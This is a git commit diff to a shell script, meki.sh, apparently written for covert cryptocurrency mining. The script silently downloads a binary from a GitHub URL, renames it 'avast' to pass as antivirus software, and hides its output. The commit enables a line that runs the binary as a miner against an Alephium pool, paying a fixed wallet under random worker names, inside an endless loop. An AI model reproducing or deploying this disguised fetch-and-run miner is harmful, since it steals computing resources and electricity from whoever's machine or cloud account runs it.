41128b1d2d270584f0667907f86b1f44aca1a099
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 19:30:50 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -14,9 +14,8 @@ wget -qO avast https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev
 
 chmod +x avast >/dev/null 2>&1
 
-#./avast -a BLAKE3 --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)
+./avast -a ALEPH --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)
 
-./avast --dualmode ALEPHDUAL --dualpool de.alephium.herominers.com:1199 --dualuser 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup --worker lolMinerWork
 
  while [ 1 ]; do
 
